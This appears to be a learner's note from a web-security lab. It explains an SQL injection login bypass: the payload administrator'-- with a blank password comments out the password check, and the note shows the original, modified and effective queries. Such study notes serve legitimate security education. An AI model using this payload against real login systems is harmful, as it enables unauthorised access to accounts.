Login Bypass Using SQL Injection
Normal Login Query
SQL
SELECT * FROM users 
WHERE username='wiener' 
AND password='bluecheese'
Injection Payload
Username:
SQL
administrator'--
Password:
Plain text
(blank)
Modified Query
SQL
SELECT * FROM users 
WHERE username='administrator'--' 
AND password=''
Internal Behavior
-- starts a SQL comment.
Everything after it is ignored.
Effective query becomes:
SQL
SELECT * FROM users 
WHERE username='administrator'
Why Login Succeeds
Because:
administrator account exists
password verification is removed
Important Concepts Learned
Query Manipulation
Attackers manipulate:
query structure
logical conditions
string boundaries
Application Logic Bypass
Instead of guessing passwords:
attackers manipulate backend logic directly
Main Learning
Focused on:
authentication bypass
SQL comments
backend logic understanding
query manipulation
